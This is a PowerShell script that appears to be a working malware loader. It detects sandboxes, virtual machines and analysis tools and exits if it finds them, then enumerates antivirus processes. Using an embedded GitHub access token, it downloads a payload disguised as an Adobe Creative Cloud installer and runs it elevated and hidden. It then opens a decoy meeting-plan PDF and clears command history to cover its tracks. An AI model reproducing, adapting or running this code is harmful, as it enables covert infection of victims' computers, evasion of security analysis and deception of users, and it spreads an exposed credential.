$ErrorActionPreference = 'SilentlyContinue'
$state = New-Object System.Collections.ArrayList

$sb = $false
$cs  = Get-WmiObject Win32_ComputerSystem
$mem = $cs.TotalPhysicalMemory
$cpu = (Get-WmiObject Win32_Processor).NumberOfCores

if ($cs.Model -match 'VirtualBox|VMware|QEMU|Xen|Virtual Machine') { $sb = $true }
if ($mem -lt 2GB)  { $sb = $true }
if ($cpu -lt 2)    { $sb = $true }
if ($env:USERNAME -eq 'Bruno') { $sb = $true }

$toolProcs = 'vboxservice|vboxtray|VGAuthService|vmtoolsd|SbieSvc|Procmon|proc_exp|wireshark|dumpcap|ollydbg|x64dbg|ida64|fakenet|windbg'
if (Get-Process | Where-Object { $_.Name -match $toolProcs }) { $sb = $true }

[void]$state.Add("sandbox=$sb")
[void]$state.Add("ram=$mem")
[void]$state.Add("cores=$cpu")

if ($sb) {
    [void]$state.Add('state=sandbox-exit')
    $state | Out-File (Join-Path $env:TEMP 'value.txt')
    Clear-History
    exit
}

$avProcs = 'MsMpEng|avp|avgnt|avguard|ekrn|bdagent|ccSvcHst|mbamservice|NortonSecurity|V3Svc|SAVService|McAfeeFramework'
$found = @(Get-Process | Where-Object { $_.Name -match $avProcs } |
    Select-Object -ExpandProperty Name -Unique)
[void]$state.Add("av=$($found -join ',')")

[void]$state.Add('state=ok')
$state | Out-File (Join-Path $env:TEMP 'value.txt')

$GhToken = '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'
$DecoyApi = 'https://api.github.com/repos/lizzyglenn100-coder/Project-Kid/contents/Travel-Meeting-Plan-Q4-2026.pdf'
$DecoyPath = Join-Path $env:TEMP 'Travel-Meeting-Plan-Q4-2026.pdf'
$wrapperApi = 'https://api.github.com/repos/lizzyglenn100-coder/Project-Kid/contents/AdobeCreativeCloudInstaller.exe'
$wrapperPath = Join-Path $env:TEMP 'AdobeCreativeCloudInstaller.exe'

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}

    # Download signed wrapper
    $resp = Invoke-RestMethod -Uri $wrapperApi -Headers $hdrs
    [IO.File]::WriteAllBytes($wrapperPath, [Convert]::FromBase64String($resp.content))
    Unblock-File -Path $wrapperPath

    # Run wrapper - UAC shows "Adobe Creative Cloud Installer" with Adobe Inc. publisher
    $proc = Start-Process $wrapperPath -Verb RunAs -WindowStyle Hidden -PassThru -Wait

    if ($proc.ExitCode -eq 0) {
        # Open decoy
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
        $resp = Invoke-RestMethod -Uri $DecoyApi -Headers $hdrs
        [IO.File]::WriteAllBytes($DecoyPath, [Convert]::FromBase64String($resp.content))
        Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "`"$DecoyPath`""
    }
} catch {}

Clear-History